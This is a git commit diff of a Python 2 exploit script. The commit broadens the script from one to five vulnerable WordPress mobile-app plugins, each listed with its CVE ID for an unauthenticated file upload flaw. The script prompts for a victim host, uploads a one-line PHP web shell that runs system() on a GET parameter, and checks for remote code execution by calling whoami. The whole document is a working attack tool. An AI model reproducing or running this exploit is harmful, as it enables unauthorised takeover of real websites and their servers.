5a1929efac1b49f49538a2c9e6aae5d786c4d7ea
Munir Njiru <alienwithin@users.noreply.github.com>
2017-03-03 16:19:15 +0300

    Added 4 New CVE's
    Own 5 CVE's one exploit

--- zen_app_mobile_wp_rfu.py
+++ zen_app_mobile_wp_rfu.py
@@ -2,10 +2,24 @@ import requests
 import random
 import string
 print "---------------------------------------------------------------------"
-print "Vulnerability: Mobile App Native <= 3.0 - Remote File Upload Exploit\nDisclosure Date: 2017-02-28\nDiscovery: Larry W. Cashdollar\nExploit Author: Munir Njiru\nCVE-ID: CVE-2017-6104\nWPVDB ID: 8743\nCWE: 434\nReference URL: 	http://www.vapidlabs.com/advisory.php?v=178\nPlugin URL: http://plugins.svn.wordpress.org/zen-mobile-app-native/\n"
+print "Multiple  Wordpress Plugin - Remote File Upload Exploit\nDiscovery: Larry W. Cashdollar\nExploit Author: Munir Njiru\nCWE: 434\n\n1. Zen App Mobile Native <=3.0 (CVE-2017-6104)\n2. Wordpress Plugin webapp-builder v2.0 (CVE-2017-1002002)\n3. Wordpress Plugin wp2android-turn-wp-site-into-android-app v1.1.4 CVE-2017-1002003)\n4.Wordpress Plugin mobile-app-builder-by-wappress v1.05 CVE-2017-1002001)\n5. Wordpress Plugin mobile-friendly-app-builder-by-easytouch v3.0 (CVE-2017-1002000)\n\nReference URLs:\nhttp://www.vapidlabs.com/advisory.php?v=178\nhttp://www.vapidlabs.com/advisory.php?v=179\nhttp://www.vapidlabs.com/advisory.php?v=180\nhttp://www.vapidlabs.com/advisory.php?v=181\nhttp://www.vapidlabs.com/advisory.php?v=182"
 print "---------------------------------------------------------------------"
 victim = raw_input("Please Enter victim host e.g. http://example.com: ")
-slug = "/wp-content/plugins/zen-mobile-app-native/server/images.php"
+plug_choice=raw_input ("\n Please choose a number representing the plugin to attack: \n1. Zen App Mobile Native <=3.0\n2. Wordpress Plugin webapp-builder v2.0\n3. Wordpress Plugin wp2android-turn-wp-site-into-android-app v1.1.4\n4.Wordpress Plugin mobile-app-builder-by-wappress v1.05\n5. Wordpress Plugin mobile-friendly-app-builder-by-easytouch v3.0\n")
+if plug_choice=="1":
+	plugin="zen-mobile-app-native"
+elif plug_choice=="2":
+	plugin="webapp-builder"
+elif plug_choice=="3":
+	plugin="wp2android-turn-wp-site-into-android-app"
+elif plug_choice=="4":
+	plugin="mobile-app-builder-by-wappress"
+elif plug_choice=="5":
+	plugin="mobile-friendly-app-builder-by-easytouch"
+else:
+	print "Invalid Plugin choice, I will now exit"
+	quit()	
+slug = "/wp-content/plugins/"+plugin+"/server/images.php"
 target=victim+slug
 def definShell(size=6, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
@@ -27,7 +41,7 @@ def exploit():
 	myShell = {'file': (shellName, '<?php echo system($_GET[\'alien\']); ?>')}
 	shellEmUp = requests.post(target, files=myShell)
 	respShell = shellEmUp.text
-	cleanURL = respShell.replace("http://example.com/",victim+"/wp-content/plugins/zen-mobile-app-native/")
+	cleanURL = respShell.replace("http://example.com/",victim+"/wp-content/plugins/"+plugin+"/")
 	shellLoc = cleanURL.replace(" ", "")
 	print "Confirming shell upload by printing current user\n"
 	shellTest=requests.get(shellLoc+"?alien=whoami")
